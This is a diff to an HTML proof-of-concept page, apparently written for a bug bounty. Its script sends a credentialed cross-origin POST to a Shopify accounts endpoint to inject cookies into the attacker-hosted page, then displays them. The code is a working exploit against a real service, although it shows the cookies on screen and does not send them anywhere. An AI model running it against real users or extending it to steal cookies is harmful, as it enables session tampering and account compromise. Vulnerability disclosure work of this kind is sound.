@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Shopify Cookie Injection PoC</h1>
+<h1>Shopify CORS + Cookie Injection PoC</h1>
 <script>
 (async () => {
-    // Step 1 — Trigger the vulnerable Shopify endpoint
+    // Step 1 — Trigger Shopify vulnerable endpoint
     await fetch("https://accounts.shopify.com/.well-known/dux", {
         method: "POST",
-        credentials: "include",
+        credentials: "include", // include victim's cookies
         headers: {
             "Content-Type": "application/json"
         },
@@ -20,11 +20,11 @@
         })
     });
 
-    // Step 2 — Read cookies set for your GitHub Pages domain
+    // Step 2 — Read cookies now set for your GitHub Pages domain
     const cookies = document.cookie;
 
-    // Step 3 — Show cookies on screen (safe PoC — no exfiltration)
-    document.body.innerHTML = "<h2>Cookies for this domain:</h2><pre>" + cookies + "</pre>";
+    // Step 3 — Display cookies on the page (safe for bug bounty)
+    document.body.innerHTML = "<h2>Injected Cookies:</h2><pre>" + cookies + "</pre>";
 })();
 </script>
 </body>
